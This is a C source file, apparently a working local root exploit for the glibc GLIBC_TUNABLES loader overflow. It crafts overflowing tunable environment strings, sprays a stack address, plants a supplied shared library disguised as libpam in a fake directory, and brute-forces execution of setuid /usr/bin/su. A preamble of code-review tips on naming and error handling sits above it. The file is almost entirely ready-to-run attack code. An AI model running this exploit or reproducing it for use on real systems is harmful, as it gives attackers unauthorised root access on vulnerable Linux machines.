#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/stat.h>
#include <sys/wait.h>

/*
Here are some improvements and explanations:
Comments and Documentation: The first thing that stands out is the lack of clear documentation. It's essential to explain the purpose and function of each section, especially in complex and potentially hazardous code like this.
 Use Consistent Naming Conventions: It's vital to maintain consistent naming conventions in your code.
 Avoid Magic Numbers: It's advisable to define magic numbers with constants or variables to make the code more readable.
 Separate Functions: Functions should ideally only do one thing. If you find they are managing multiple tasks, consider breaking them up.
 Error Handling: Let's make note of when something breaks.

 With that in mind: -
Clearer function separation
Better error handling
Removed magic numbers
Better naming conventions
  */

#define ENV_ITEM_SIZE ((32 * 4096) - 1)
#define STACK_TARGET 0x00007ffdfffff018
#define NUM_EMPTY 0x1000
#define ENV_NUM (NUM_EMPTY + 0x11 + 1)

char* p64(uint64_t val) {
    char* ret = malloc(8);
    if (!ret) {
        perror("Failed to allocate memory for p64");
        exit(EXIT_FAILURE);
    }
    memcpy(ret, &val, 8);
    ret[7] = 0;
    return ret;
}

char* allocation_helper(const char* base, int size, char fill) {
    char* ret = NULL;
    char* chunk = malloc(size + 1);
    if (!chunk) {
        perror("Failed to allocate memory for chunk");
        exit(EXIT_FAILURE);
    }
    memset(chunk, fill, size);
    chunk[size] = 0;
    asprintf(&ret, "%s%s", base, chunk);
    free(chunk);
    return ret;
}

char* create_u64_filler(uint64_t val, size_t size) {
    uint64_t* ret = malloc(size + 1);
    if (!ret) {
        perror("Failed to allocate memory for u64 filler");
        exit(EXIT_FAILURE);
    }
    memset(ret, 0x41, size);
    for (int i = 0; i < size / 8; i++) {
        ret[i] = val;
    }
    char* ret2 = (char*)ret;
    ret2[size] = 0;
    return ret2;
}

void setup_dir() {
    // Ensure compatibility with various distros before using this
    system("rm -rf ./\x55");
    mkdir("./\x55", 0777);
    system("cp /usr/lib/x86_64-linux-gnu/libc.so.6 ./\x55/libc.so.6");
    system("cp ./suid_lib.so ./\x55/libpam.so.0");
    system("cp ./suid_lib.so ./\x55/libpam_misc.so.0");
}

int main(int argc, char** argv) {
    setup_dir();

    char** new_env = malloc((sizeof(char*) * ENV_NUM) + 1);
    if (!new_env) {
        perror("Failed to allocate memory for new_env");
        exit(EXIT_FAILURE);
    }
    memset(new_env, 0, (sizeof(char*) * ENV_NUM) + 1);

    const char* normal = "GLIBC_TUNABLES=";
    const char* normal2 = "GLIBC_TUNABLES=glibc.malloc.mxfast:";
    const char* overflow = "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=";
    
    new_env[0] = allocation_helper(normal, 0xd00, 'x');
    new_env[1] = allocation_helper(normal, 0x1000 - 0x20, 'A');
    new_env[2] = allocation_helper(overflow, 0x4f0, 'B');
    new_env[3] = allocation_helper(overflow, 0x1, 'C');
    new_env[4] = allocation_helper(normal2, 0x2, 'D');

    for (int i = 5; i < ENV_NUM; i++) {
        new_env[i] = "";
        if (i > NUM_EMPTY)
            break;
    }

    new_env[0xb8] = p64(STACK_TARGET);

    for (int i = 0xb9; i < ENV_NUM - 1; i++) {
        new_env[i] = create_u64_filler(0xffffffffffffffd0, ENV_ITEM_SIZE);
    }
    new_env[ENV_NUM - 2] = "12345678901"; // padding

    char* new_argv[] = { "/usr/bin/su", "--lmao", NULL };

    int attempts = 0;
    while (1) {
        attempts++;
        if (attempts % 100 == 0) {
            printf("\n[+] Attempt %d\n", attempts);
        }

        int pid = fork();
        if (pid < 0) {
            perror("fork");
            exit(EXIT_FAILURE);
        }

        if (pid) {
            int status = 0;
            waitpid(pid, &status, 0);
            if (status == 0) {
                puts("[+] Goodbye");
                exit(EXIT_SUCCESS);
            }
            printf(".");
            fflush(stdout);
        } else {
            execve(new_argv[0], new_argv, new_env);
            perror("execve");
            exit(EXIT_FAILURE);
        }
    }
}
